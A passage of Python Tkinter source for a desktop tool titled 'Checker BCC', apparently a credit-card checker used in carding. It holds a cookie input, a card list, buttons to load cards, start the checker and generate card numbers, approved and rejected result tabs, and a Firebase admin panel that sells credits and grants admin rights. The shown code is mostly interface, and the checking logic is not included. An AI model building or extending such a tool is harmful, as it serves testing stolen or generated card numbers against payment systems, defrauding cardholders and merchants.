                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font_bold,
                            padx=15,
                            pady=5)
    btn_generar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_copiar = HoverButton(frame_botones, 
                            text="Copiar", 
                            command=copiar_tarjetas,
                            bg=COLOR_BOTON, 
                            fg=COLOR_TEXTO,
                            activebackground=COLOR_BOTON_HOVER,
                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font_bold,
                            padx=15,
                            pady=5)
    btn_copiar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_enviar = HoverButton(frame_botones, 
                           text="Enviar a Lista", 
                           command=enviar_a_lista,
                           bg=COLOR_SECUNDARIO, 
                           fg=COLOR_FONDO,
                           activebackground="#9C64FF",
                           activeforeground=COLOR_FONDO,
                           relief='flat',
                           font=custom_font_bold,
                           padx=15,
                           pady=5)
    btn_enviar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_limpiar_gen = HoverButton(frame_botones, 
                                text="Limpiar", 
                                command=limpiar_generador,
                                bg=COLOR_BOTON_OSCURO, 
                                fg=COLOR_TEXTO,
                                activebackground="#333333",
                                activeforeground=COLOR_TEXTO,
                                relief='flat',
                                font=custom_font_bold,
                                padx=15,
                                pady=5)
    btn_limpiar_gen.pack(side='left', padx=5, fill='x', expand=True)
    
    # Área de resultados
    tk.Label(frame_principal, 
            text="Resultados:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(5, 0))
    
    scroll_resultado = tk.Scrollbar(frame_principal)
    scroll_resultado.pack(side='right', fill='y')
    
    texto_resultado = tk.Text(frame_principal, 
                            yscrollcommand=scroll_resultado.set,
                            height=8,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO,
                            relief='flat')
    texto_resultado.pack(fill='both', expand=True)
    scroll_resultado.config(command=texto_resultado.yview)

# Crear la interfaz gráfica principal
root = tk.Tk()
root.title("Checker BCC - Sistema de Créditos")
root.geometry("600x750")
root.minsize(600, 750)
root.maxsize(600, 750)
root.resizable(False, False)
root.configure(bg=COLOR_FONDO)

# Configurar fuente personalizada
try:
    custom_font = tkfont.Font(family="Segoe UI", size=10)
    custom_font_bold = tkfont.Font(family="Segoe UI", size=10, weight="bold")
except:
    custom_font = tkfont.Font(size=10)
    custom_font_bold = tkfont.Font(size=10, weight="bold")

# Configurar evento para procesar mensajes
root.bind('<<MessageQueued>>', procesar_mensajes)

# Frame principal con estilo futurista
frame_principal = tk.Frame(root, bg=COLOR_FONDO, padx=20, pady=20)
frame_principal.pack(fill='both', expand=True)

# Título
titulo = tk.Label(frame_principal, 
                 text="CHECKER BCC", 
                 font=("Segoe UI", 18, "bold"), 
                 fg=COLOR_PRIMARIO, 
                 bg=COLOR_FONDO)
titulo.pack(pady=(0, 10))

# Información de usuario
frame_usuario = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_usuario.pack(fill='x', pady=(0, 10))

etiqueta_usuario = tk.Label(frame_usuario, 
                          text="No autenticado", 
                          font=custom_font,
                          fg=COLOR_TEXTO, 
                          bg=COLOR_FONDO)
etiqueta_usuario.pack(side='left')

etiqueta_creditos = tk.Label(frame_usuario, 
                           text="Créditos: 0", 
                           font=custom_font_bold,
                           fg=COLOR_TEXTO, 
                           bg=COLOR_FONDO)
etiqueta_creditos.pack(side='right')

# Frame de entrada de datos
frame_entrada = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_entrada.pack(fill='x', pady=10)

# Campo para la cookie
tk.Label(frame_entrada, 
        text="Cookie:", 
        font=custom_font_bold, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_cookie = tk.Entry(frame_entrada, 
                       width=50, 
                       font=custom_font,
                       bg=COLOR_ENTRY, 
                       fg=COLOR_TEXTO,
                       insertbackground=COLOR_TEXTO,
                       relief='flat',
                       highlightthickness=1,
                       highlightcolor=COLOR_SECUNDARIO,
                       highlightbackground=COLOR_SECUNDARIO)
entry_cookie.pack(fill='x', pady=5)

# Campo para las tarjetas
tk.Label(frame_entrada, 
        text="Lista de Tarjetas:", 
        font=custom_font_bold, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_lista_cartoes = tk.Text(frame_entrada, 
                             height=8,
                             font=custom_font,
                             bg=COLOR_ENTRY, 
                             fg=COLOR_TEXTO,
                             insertbackground=COLOR_TEXTO,
                             relief='flat',
                             highlightthickness=1,
                             highlightcolor=COLOR_SECUNDARIO,
                             highlightbackground=COLOR_SECUNDARIO)
entry_lista_cartoes.pack(fill='x', pady=5)

# Frame para botones principales
frame_botones_principales = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_botones_principales.pack(pady=10)

btn_enviar = HoverButton(frame_botones_principales, 
                        text="CARGAR CC'S", 
                        command=enviar_datos,
                        bg=COLOR_BOTON, 
                        fg=COLOR_TEXTO,
                        activebackground=COLOR_BOTON_HOVER,
                        activeforeground=COLOR_TEXTO,
                        relief='flat',
                        font=custom_font_bold,
                        padx=20,
                        pady=8,
                        bd=0)
btn_enviar.pack(side='left', padx=5)

btn_iniciar = HoverButton(frame_botones_principales, 
                         text="INICIAR CHECKER", 
                         command=iniciar_verificacion,
                         bg=COLOR_SECUNDARIO, 
                         fg=COLOR_FONDO,
                         activebackground="#9C64FF",
                         activeforeground=COLOR_FONDO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_iniciar.pack(side='left', padx=5)

btn_generador = HoverButton(frame_botones_principales, 
                          text="Generar Tarjetas", 
                          command=abrir_generador_tarjetas,
                          bg=COLOR_BOTON_OSCURO, 
                          fg=COLOR_TEXTO,
                          activebackground="#333333",
                          activeforeground=COLOR_TEXTO,
                          relief='flat',
                          font=custom_font_bold,
                          padx=20,
                          pady=8,
                          bd=0)
btn_generador.pack(side='left', padx=5)

btn_pausar = HoverButton(frame_botones_principales, 
                        text="Pausar", 
                        command=pausar_verificacion,
                        bg=COLOR_BOTON_OSCURO, 
                        fg=COLOR_TEXTO,
                        activebackground="#333333",
                        activeforeground=COLOR_TEXTO,
                        relief='flat',
                        font=custom_font_bold,
                        padx=20,
                        pady=8,
                        bd=0,
                        state="disabled")
btn_pausar.pack(side='left', padx=5)

# Frame para botones secundarios (debajo de los principales)
frame_botones_secundarios = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_botones_secundarios.pack(pady=(0, 10))

btn_limpiar = HoverButton(frame_botones_secundarios, 
                         text="Limpiar Lista", 
                         command=limpiar_lista,
                         bg=COLOR_BOTON_OSCURO, 
                         fg=COLOR_TEXTO,
                         activebackground="#333333",
                         activeforeground=COLOR_TEXTO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_limpiar.pack(side='left', padx=5)

# Botón de créditos (solo visible para admins)
btn_creditos = HoverButton(frame_botones_secundarios, 
                         text="Administrar Créditos", 
                         command=abrir_panel_creditos,
                         bg=COLOR_SECUNDARIO, 
                         fg=COLOR_FONDO,
                         activebackground="#9C64FF",
                         activeforeground=COLOR_FONDO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_creditos.pack_forget()  # Inicialmente oculto

# Botón de admin (solo visible para admins)
btn_admin = HoverButton(frame_botones_secundarios, 
                      text="Panel Admin", 
                      command=lambda: abrir_panel_admin(),
                      bg=COLOR_ADMIN, 
                      fg=COLOR_FONDO,
                      activebackground="#FFC04D",
                      activeforeground=COLOR_FONDO,
                      relief='flat',
                      font=custom_font_bold,
                      padx=20,
                      pady=8,
                      bd=0)
btn_admin.pack_forget()  # Inicialmente oculto

# Área de mensajes
mensaje_label = tk.Label(frame_principal, 
                        text="", 
                        font=custom_font,
                        fg=COLOR_PRIMARIO, 
                        bg=COLOR_FONDO)
mensaje_label.pack(pady=10)

# Notebook para resultados con estilo moderno
style = ttk.Style()
style.theme_use('clam')
style.configure('TNotebook', background=COLOR_FONDO, borderwidth=0)
style.configure('TNotebook.Tab', 
               background=COLOR_FONDO, 
               foreground=COLOR_TEXTO,
               padding=[10, 5],
               font=custom_font_bold)
style.map('TNotebook.Tab', 
          background=[('selected', COLOR_SECUNDARIO)],
          foreground=[('selected', COLOR_FONDO)])

notebook = ttk.Notebook(frame_principal)
notebook.pack(fill='both', expand=True, pady=10)

# Pestaña de aprobadas
frame_aprovadas = tk.Frame(notebook, bg=COLOR_FONDO)
scroll_aprovadas = tk.Scrollbar(frame_aprovadas)
scroll_aprovadas.pack(side='right', fill='y')

mensaje_aprovada_text = tk.Text(frame_aprovadas, 
                               yscrollcommand=scroll_aprovadas.set,
                               bg=COLOR_ENTRY, 
                               fg=COLOR_TEXTO,
                               font=custom_font,
                               insertbackground=COLOR_TEXTO,
                               relief='flat',
                               padx=10,
                               pady=10)
mensaje_aprovada_text.pack(fill='both', expand=True)
scroll_aprovadas.config(command=mensaje_aprovada_text.yview)

notebook.add(frame_aprovadas, text="Aprobadas")

# Pestaña de rechazadas
frame_reprovadas = tk.Frame(notebook, bg=COLOR_FONDO)
scroll_reprovadas = tk.Scrollbar(frame_reprovadas)
scroll_reprovadas.pack(side='right', fill='y')

mensaje_reprovada_text = tk.Text(frame_reprovadas, 
                               yscrollcommand=scroll_reprovadas.set,
                               bg=COLOR_ENTRY, 
                               fg=COLOR_TEXTO,
                               font=custom_font,
                               insertbackground=COLOR_TEXTO,
                               relief='flat',
                               padx=10,
                               pady=10)
mensaje_reprovada_text.pack(fill='both', expand=True)
scroll_reprovadas.config(command=mensaje_reprovada_text.yview)

notebook.add(frame_reprovadas, text="Rechazadas")

# Footer
footer = tk.Label(frame_principal, 
                 text="© 2023 Checker BCC - Sistema de Créditos", 
                 font=custom_font,
                 fg=COLOR_TEXTO, 
                 bg=COLOR_FONDO)
footer.pack(side='bottom', pady=(20, 0))

# ============= PANEL DE ADMINISTRACIÓN =============
def abrir_panel_admin():
    """Abre el panel de administración"""
    admin = tk.Toplevel(root)
    admin.title("Panel de Administración")
    admin.geometry("600x500")
    admin.resizable(False, False)
    admin.configure(bg=COLOR_FONDO)
    admin.transient(root)
    admin.grab_set()
    
    # Título
    tk.Label(admin, 
            text="Panel de Administración", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_ADMIN, 
            bg=COLOR_FONDO).pack(pady=10)
    
    # Frame principal
    frame_principal = tk.Frame(admin, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    # Obtener todos los usuarios desde Firebase
    try:
        all_users = firebase_get_all_users(user_token)
        if not all_users:
            all_users = {}
    except:
        all_users = {}
    
    # Lista de usuarios
    tk.Label(frame_principal, 
            text="Usuarios Registrados:", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    # Treeview para mostrar usuarios
    columns = ('usuario', 'creditos', 'es_admin', 'email')
    tree = ttk.Treeview(frame_principal, columns=columns, show='headings')
    
    # Configurar columnas
    tree.heading('usuario', text='Usuario')
    tree.heading('creditos', text='Créditos')
    tree.heading('es_admin', text='Es Admin')
    tree.heading('email', text='Email')
    
    tree.column('usuario', width=150)
    tree.column('creditos', width=80, anchor='center')
    tree.column('es_admin', width=80, anchor='center')
    tree.column('email', width=200)
    
    # Añadir scrollbar
    scrollbar = ttk.Scrollbar(frame_principal, orient=tk.VERTICAL, command=tree.yview)
    tree.configure(yscroll=scrollbar.set)
    scrollbar.pack(side='right', fill='y')
    tree.pack(fill='both', expand=True)
    
    # Llenar con datos
    for user_id, user_data in all_users.items():
        tree.insert('', 'end', values=(
            user_data.get('username', ''),
            user_data.get('creditos', 0),
            'Sí' if user_data.get('es_admin', False) else 'No',
            user_data.get('email', '')
        ), tags=(user_id,))
    
    # Frame para controles de admin
    frame_controles = tk.Frame(frame_principal, bg=COLOR_FONDO)
    frame_controles.pack(fill='x', pady=10)
    
    # Botón para agregar créditos
    btn_agregar_creditos = HoverButton(frame_controles, 
                                     text="Agregar Créditos", 
                                     command=lambda: agregar_creditos_admin(tree),
                                     bg=COLOR_SECUNDARIO, 
                                     fg=COLOR_FONDO,
                                     activebackground="#9C64FF",
                                     activeforeground=COLOR_FONDO,
                                     relief='flat',
                                     font=custom_font_bold,
                                     padx=15,
                                     pady=5)
    btn_agregar_creditos.pack(side='left', padx=5, fill='x', expand=True)
    
    # Botón para hacer admin
    btn_hacer_admin = HoverButton(frame_controles, 
                                text="Hacer Admin", 
                                command=lambda: cambiar_permisos_admin(tree, True),
                                bg=COLOR_ADMIN, 
                                fg=COLOR_FONDO,
                                activebackground="#FFC04D",
                                activeforeground=COLOR_FONDO,
                                relief='flat',
                                font=custom_font_bold,
                                padx=15,
                                pady=5)
    btn_hacer_admin.pack(side='left', padx=5, fill='x', expand=True)
    
    # Botón para quitar admin
    btn_quitar_admin = HoverButton(frame_controles, 
                                  text="Quitar Admin", 
                                  command=lambda: cambiar_permisos_admin(tree, False),
                                  bg=COLOR_BOTON_OSCURO, 
                                  fg=COLOR_TEXTO,
                                  activebackground="#333333",
                                  activeforeground=COLOR_TEXTO,
                                  relief='flat',
                                  font=custom_font_bold,
                                  padx=15,
                                  pady=5)
    btn_quitar_admin.pack(side='left', padx=5, fill='x', expand=True)

def agregar_creditos_admin(tree):
    """Agrega créditos al usuario seleccionado"""
    seleccion = tree.selection()
    if not seleccion:
        messagebox.showerror("Error", "Seleccione un usuario")
        return
    
    item = tree.item(seleccion[0])
    user_id = item['tags'][0]
    usuario = item['values'][0]
    
    # Ventana para ingresar cantidad
    ventana = tk.Toplevel(root)
    ventana.title(f"Agregar Créditos a {usuario}")
    ventana.geometry("300x150")
    ventana.resizable(False, False)
    ventana.configure(bg=COLOR_FONDO)
    ventana.transient(root)
    ventana.grab_set()
    
    tk.Label(ventana, 
            text=f"Ingrese créditos para {usuario}:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    entry_creditos = tk.Entry(ventana, 
                            width=10, 
                            font=custom_font,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO)
    entry_creditos.pack(pady=5)
    
    def confirmar():
        try:
            cantidad = int(entry_creditos.get())
            if cantidad <= 0:
                messagebox.showerror("Error", "Ingrese una cantidad positiva")
                return
                
            # Actualizar créditos en Firebase
            if firebase_update_credits(user_id, user_token, cantidad + int(item['values'][1])):
                # Actualizar el treeview
                tree.item(seleccion[0], values=(
                    item['values'][0],
                    cantidad + int(item['values'][1]),
                    item['values'][2],
                    item['values'][3]
                ))
                
                # Actualizar datos locales si es el usuario actual
                if usuario == usuario_actual:
                    usuarios[usuario_actual]['creditos'] = cantidad + int(item['values'][1])
                    actualizar_interfaz_usuario()
                
                messagebox.showinfo("Éxito", f"Se agregaron {cantidad} créditos a {usuario}")
                ventana.destroy()
            else:
                messagebox.showerror("Error", "No se pudo actualizar los créditos")
        except ValueError:
            messagebox.showerror("Error", "Ingrese un número válido")
    
    btn_confirmar = HoverButton(ventana, 
                              text="Confirmar", 
                              command=confirmar,
                              bg=COLOR_SECUNDARIO, 
                              fg=COLOR_FONDO,
                              activebackground="#9C64FF",
                              activeforeground=COLOR_FONDO,
                              relief='flat',
                              font=custom_font_bold,
                              padx=15,
                              pady=5)
    btn_confirmar.pack(pady=10)

def cambiar_permisos_admin(tree, hacer_admin):
    """Cambia los permisos de admin de un usuario"""
    seleccion = tree.selection()
    if not seleccion:
        messagebox.showerror("Error", "Seleccione un usuario")
        return
    
    item = tree.item(seleccion[0])
    user_id = item['tags'][0]
    usuario = item['values'][0]
    
    # No permitir cambiar permisos a uno mismo
    if usuario == usuario_actual:
        messagebox.showerror("Error", "No puede cambiar sus propios permisos")
        return
    
    # Cambiar permisos en Firebase
    if firebase_make_admin(user_id, user_token, hacer_admin):
        # Actualizar el treeview
        tree.item(seleccion[0], values=(
            item['values'][0],
            item['values'][1],
            'Sí' if hacer_admin else 'No',
            item['values'][3]
        ))
        
        messagebox.showinfo("Éxito", f"Usuario {usuario} {'ahora es admin' if hacer_admin else 'ya no es admin'}")
    else:
        messagebox.showerror("Error", "No se pudo cambiar los permisos")

# Mostrar ventana de login al iniciar
root.after(100, abrir_login)

# Ejecutar la aplicación
root.mainloop()